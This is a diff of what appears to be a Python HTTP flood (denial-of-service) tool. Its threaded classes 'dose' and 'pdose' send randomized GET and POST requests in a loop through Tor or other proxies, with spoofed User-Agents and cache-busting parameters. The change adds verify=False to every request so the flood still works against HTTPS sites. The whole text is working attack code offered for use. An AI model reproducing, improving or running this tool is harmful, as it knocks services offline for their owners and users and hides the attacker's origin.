@@ -3047,9 +3047,9 @@ class dose(threading.Thread):
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
-       session.get(u,headers=h,timeout=self.timeout)
+       session.get(u,headers=h,timeout=self.timeout, verify=False)
      else:
-       requests.get(u,headers=h,timeout=self.timeout)
+       requests.get(u,headers=h,timeout=self.timeout, verify=False)
     elif self.method==2:
       req="POST"
       q=''
@@ -3078,9 +3078,9 @@ class dose(threading.Thread):
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
-       session.post(u, data={k:j}, headers=h,timeout=self.timeout)
+       session.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
       else:
-       requests.post(u, data={k:j}, headers=h,timeout=self.timeout)
+       requests.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
     elif self.method==3:
      i=random.randint(1,2)
      if i==1:
@@ -3102,9 +3102,9 @@ class dose(threading.Thread):
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
-       session.get(u,headers=h,timeout=self.timeout)
+       session.get(u,headers=h,timeout=self.timeout, verify=False)
       else:
-       requests.get(u,headers=h,timeout=self.timeout)
+       requests.get(u,headers=h,timeout=self.timeout, verify=False)
      else:
       req="POST"
       q=''
@@ -3133,9 +3133,9 @@ class dose(threading.Thread):
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
-       session.post(u, data={k:j}, headers=h,timeout=self.timeout)
+       session.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
       else:
-       requests.post(u, data={k:j}, headers=h,timeout=self.timeout)
+       requests.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
     if stop==True:
         break
     counter+=1
@@ -3211,7 +3211,7 @@ class pdose(threading.Thread):
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
-     requests.get(u,headers=h,proxies=proxy,timeout=self.timeout)
+     requests.get(u,headers=h,proxies=proxy,timeout=self.timeout, verify=False)
     elif self.method==2:
       req="POST"
       k=''
@@ -3224,7 +3224,7 @@ class pdose(threading.Thread):
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)+str(random.randint(1,10000))
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
-      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout)
+      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout, verify=False)
     elif self.method==3:
      i=random.randint(1,2)
      if i==1:
@@ -3241,7 +3241,7 @@ class pdose(threading.Thread):
        jo='?' 
       u+=jo+q+"="+p
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
-      requests.get(u,headers=h,proxies=proxy,timeout=self.timeout)
+      requests.get(u,headers=h,proxies=proxy,timeout=self.timeout, verify=False)
      else:
       req="POST"
       k=''
@@ -3254,7 +3254,7 @@ class pdose(threading.Thread):
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
-      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout)
+      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout, verify=False)
     if stop==True:
         break
     counter+=1
